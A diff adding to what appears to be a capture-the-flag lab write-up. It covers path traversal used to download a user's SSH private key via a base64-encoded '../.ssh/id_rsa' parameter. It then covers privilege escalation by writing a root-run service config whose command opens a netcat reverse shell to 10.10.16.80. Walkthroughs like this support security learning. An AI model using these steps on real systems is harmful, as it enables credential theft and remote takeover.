@@ -74,4 +74,56 @@ Once the exemption has been removed, and the certificate accepted, this is the c
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/cert-in.png" alt="nmap2 scan">
 
+### Exploiting path traversal
+
 Looking at the value of the episodes, this can be vulnerable to path traversal.
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/path-trasversal.png" alt="nmap2 scan">
+
+Looking at this, we might be able to see a couple of the users where one of them migh have the SSH key saved!
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/which-user.png" alt="nmap2 scan">
+
+Looking at couple of the episodes, they are encoded in base64, that means that we might get the SSH key with encoding the parameter in base64.
+```
+echo -n "../.ssh/id_rsa" | base64
+```
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/which-user.png" alt="nmap2 scan">
+
+Pasting the result in the parameter ```path=``` effectively we can download the SSH key. 
+
+ 
+
+Once they is downloaded, it's time to give it permissions and login through SSH. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/getting.png" alt="nmap2 scan">
+
+And we're in! Time top do privilege escalation. 0
+
+## Privilege escalation
+
+In the home directory of ```professor``` there is a file owned by root called ```mencached.ini``, this command is a writable command where we might be able to put our reverse shell. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/getting.png" alt="nmap2 scan">
+
+So effectively we write the command with the following commnad. 
+```
+echo -ne "[program:memcached]\ncommand = nc 10.10.16.80 4444 -e /bin/bash" > memcached.ini
+```
+So this program is a service. Once we write it, we can wait and get a reverse shell back. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/got-root.png" alt="nmap2 scan">
+
+And we are root!
+
+## Reading user and root flag!
+
+Now that we know the privilege escalation, we can read the root and the user flag.
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/casa/all-flags.png" alt="nmap2 scan">
+
+The system has been owned
+
+## Conclusion
+
+It was interesting box due to the certificates that we have to import and part of the information gathering made with psy shell. It was a fun box due to the path traversal and privilege escalation! That was the end my friends. 
